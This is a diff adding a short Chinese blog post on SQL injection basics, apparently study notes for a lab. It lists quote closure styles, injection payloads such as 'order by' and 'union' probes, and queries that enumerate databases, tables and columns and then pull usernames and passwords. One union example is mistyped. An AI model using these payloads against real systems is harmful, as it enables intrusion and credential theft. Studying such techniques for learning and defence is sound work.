@@ -155,6 +155,87 @@
     
     
     <article
+  id="post-sql注入1"
+  class="article article-type-post"
+  itemscope
+  itemprop="blogPost"
+  data-scroll-reveal
+>
+  <div class="article-inner">
+    
+    <header class="article-header">
+       
+<h2 itemprop="name">
+  <a class="article-title" href="/2021/09/10/sql%E6%B3%A8%E5%85%A51/"
+    >sql注入1</a> 
+</h2>
+ 
+
+      
+    </header>
+     
+    <div class="article-meta">
+      <a href="/2021/09/10/sql%E6%B3%A8%E5%85%A51/" class="article-date">
+  <time datetime="2021-09-10T10:10:59.000Z" itemprop="datePublished">2021-09-10</time>
+</a> 
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/web%E5%AE%89%E5%85%A8/">web安全</a>
+  </div>
+   
+    </div>
+      
+    <div class="article-entry" itemprop="articleBody">
+       
+  <p><strong>常见sql语句的闭合方式</strong></p>
+<blockquote>
+<p>单引号 ‘’<br>双引号 “”<br>单引号加括号 (‘’)<br>双引号加括号 (“”)</p>
+</blockquote>
+<p><strong>mysql基础用法</strong><br>查列数</p>
+<blockquote>
+<p>order by<br>例：id=1 order by 3#</p>
+</blockquote>
+<p>查回显（联合查询)</p>
+<blockquote>
+<p>union select<br>例：id=-1 union by 1,2,3#</p>
+</blockquote>
+<p>查库 </p>
+<blockquote>
+<p>select schema_name from information_schema.schemata</p>
+</blockquote>
+<p>查表 </p>
+<blockquote>
+<p>select table_name from information_schema.tables where<br>table_schema=’security’</p>
+</blockquote>
+<p>查列 </p>
+<blockquote>
+<p>select column_name from information_schema.columns where<br>table_name=’users’</p>
+</blockquote>
+<p>查字段 </p>
+<blockquote>
+<p>select username,password from security.users</p>
+</blockquote>
+ 
+      <!-- reward -->
+      
+    </div>
+    
+
+    <!-- copyright -->
+    
+    <footer class="article-footer">
+       
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/sql%E6%B3%A8%E5%85%A5/" rel="tag">sql注入</a></li></ul>
+
+    </footer>
+  </div>
+
+    
+ 
+    
+</article>
+
+    
+    <article
   id="post-命令执行"
   class="article article-type-post"
   itemscope
